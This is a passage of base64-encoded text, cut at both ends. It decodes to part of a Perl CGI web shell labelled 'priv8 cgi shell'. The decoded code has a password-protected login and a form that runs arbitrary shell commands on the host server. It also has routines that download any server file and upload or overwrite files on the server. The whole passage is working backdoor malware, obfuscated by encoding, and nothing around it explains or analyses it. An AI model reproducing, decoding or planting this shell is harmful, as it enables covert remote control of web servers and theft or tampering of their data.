YW1lPSJhIiB2YWx1ZT0ibG9naW4iPgo8L2ZvbnQ+Cjxmb250IHNpemU9IjMiPgpsb2dpbjogPGIg
c3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+cHJpdjggY2dpIHNo
ZWxsPC9iPjxicj4KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIz
Ij48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2
YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQojLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tCnN1YiBQcmludFBhZ2VGb290ZXIKewoJcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1s
PiI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBh
bGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQojIHZhcmlh
YmxlICRDb29raWVzeycnfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBHZXRDb29raWVzCnsK
CUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7Cglmb3JlYWNo
ICRjb29raWUoQGh0dHBjb29raWVzKQoJewoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29v
a2llKTsKCQkkQ29va2llc3skaWR9ID0gJHZhbDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQKIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4KewoJcHJpbnQgIjxjb2RlPkNvbm5lY3Rp
b24gY2xvc2VkIGJ5IGZvcmVpZ24gaG9zdC48YnI+PGJyPjwvY29kZT4iOwp9CgojLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBs
b2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXBy
aW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUK
CSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dp
blNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNl
ci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxs
b3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBt
YXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhh
dCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQ
ZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29y
ZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3Jk
O1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZv
cm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gK
CXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExv
Z2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlBy
aW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBh
Z2VGb290ZXI7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwg
Zm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcwojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtCnsKCSRQcm9tcHQgPSAkV2lu
TlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1c
JCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFj
dGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFs
dWU9ImNvbW1hbmQiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJl
bnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4KPGlucHV0IHR5cGU9
InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CgpFTkQKfQoKIy0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2Vy
IHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURv
d25sb2FkRm9ybQp7CgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1p
blxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZv
cm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1
dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBl
PSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+
PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+
PGJyPgpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4KPC9mb3Jt
Pgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1M
IGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIk
Q3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7Cglw
cmludCA8PEVORDsKPGNvZGU+Cgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9y
bS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1
cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9
IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9
Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBs
b2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+
CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1
dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4K
RU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3
aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1p
bmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkg
b24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcg
b24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEk
V2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgoKPGNvZGU+CkNvbW1h
bmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29u
ZChzKS4KPGJyPktpbGxlZCBpdCEKRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJ
JlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMg
VGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMg
dGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIg
YW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxl
ZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQg
aW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5k
IGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5
IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3Ig
bWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIg
RXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBp
dCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3Rvcnkg
aW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXll
ZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVu
dERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnRE
aXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRX
aW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJ
CXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kIjsKCX0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1h
bmQsIGRpc3BsYXkgdGhlIG91dHB1dAoJewoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkUHJv
bXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1
cnJlbnREaXJdXCQgIjsKCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZDx4bXA+IjsKCQkkQ29t
bWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0
b3I7CgkJaWYoISRXaW5OVCkKCQl7CgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7
CgkJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsKCQl9CgkJaWYoJFNob3dEeW5hbWlj
T3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJCXsKCQkJJHw9MTsKCQkJ
JENvbW1hbmQgLj0gIiB8IjsKCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7CgkJCXdo
aWxlKDxDb21tYW5kT3V0cHV0PikKCQkJewoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87CgkJCQlw
cmludCAiJF9cbiI7CgkJCX0KCQkJJHw9MDsKCQl9CgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVy
IGNvbW1hbmQgY29tcGxldGVzCgkJewoJCQlwcmludCBgJENvbW1hbmRgOwoJCX0KCQlpZighJFdp
bk5UKQoJCXsKCQkJYWxhcm0oMCk7CgkJfQoJCXByaW50ICI8L3htcD4iOwoJfQoJJlByaW50Q29t
bWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEg
bGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZp
bGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQg
c3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1
YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkg
PSBAXzsKCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cwoJewoJCSMgZW5jb2Rl
IHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXIKCQkkRmlsZVVy
bCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7CgkJJERvd25sb2Fk
TGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOwoJCSRI
dG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIx
OyBVUkw9JERvd25sb2FkTGlua1wiPiI7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCXByaW50
IDw8RU5EOwo8Y29kZT4KClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPgpJZiB0aGUg
ZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwKPGEgaHJlZj0iJERvd25sb2Fk
TGluayI+Q2xpY2sgSGVyZTwvYT4uCkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJ
CSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlBy
aW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6
ICQhIjsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0K
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZp
ZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUKIyBicm93c2VyLCBzbyB0
aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLgojIEFyZ3VtZW50IDE6IEZ1bGx5
IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50LgojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcgp7Cglsb2NhbCgkU2VuZEZpbGUpID0gQF87
CglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5n
Cgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJYmlubW9kZShTRU5ERklMRSk7CgkJCWJpbm1vZGUoU1RE
T1VUKTsKCQl9CgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107CgkJKCRGaWxlbmFt
ZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOwoJCXByaW50ICJDb250ZW50LVR5cGU6
IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsKCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxl
U2l6ZVxuIjsKCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5h
bWU9JDFcblxuIjsKCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsKCQljbG9zZShTRU5ERklMRSk7
Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYi
KTsKCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOwoJCSZQcmludEZp
bGVEb3dubG9hZEZvcm07CgoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0KCgojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9h
ZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UKIyB0byB0aGUgdXNlciBhbmQgcHJvdmlk
ZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuCiMgVGhp
cyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxp
bmsuIEluIHRoaXMgY2FzZSwKIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93
c2VyLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCZWdpbkRvd25sb2FkCnsKCSMgZ2V0IGZ1
bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKCWlmKCgkV2lu
TlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfAoJCSghJFdpbk5UICYgKCRUcmFu
c2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQoJewoJCSRUYXJnZXRGaWxl
ID0gJFRyYW5zZmVyRmlsZTsKCX0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlCgl7CgkJY2hvcCgk
VGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsK
CQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJfQoKCWlmKCRPcHRpb25z
IGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlCgl7CgkJJlNlbmRGaWxlVG9Ccm93
c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGlu
ayBwYWdlCgl7CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7Cgl9Cn0KCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1
c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGUgaXMgbm90IHNwZWNpZmll
ZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZp
bGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLgojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tCnN1YiBVcGxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHBy
aW50IHRoZSB1cGxvYWQgZm9ybSBhZ2FpbgoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikKCXsKCQkm
UHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJJlByaW50RmlsZVVwbG9hZEZvcm07CgkJJlByaW50UGFn
ZUZvb3RlcjsKCQlyZXR1cm47Cgl9CgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgoJIyBzdGFydCB0
aGUgdXBsb2FkaW5nIHByb2Nlc3MKCXByaW50ICJVcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAk
Q3VycmVudERpci4uLjxicj4iOwoKCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1l
IG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQKCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0
TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJJFRyYW5zZmVyRmlsZSA9fiBtIShb
Xi9eXFxdKikkITsKCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOwoKCSRUYXJnZXRGaWxlU2l6
ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOwoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdl
IGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0CglpZigtZSAkVGFyZ2V0TmFtZSAmJiAk
T3B0aW9ucyBuZSAib3ZlcndyaXRlIikKCXsKCQlwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBm
aWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQK
CXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUo
VVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEn
fTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxl
U2l6ZSBCeXRlcy48YnI+IjsKCQkJcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsK
CQl9CgkJZWxzZQoJCXsKCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CglwcmludCAi
IjsKCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMt
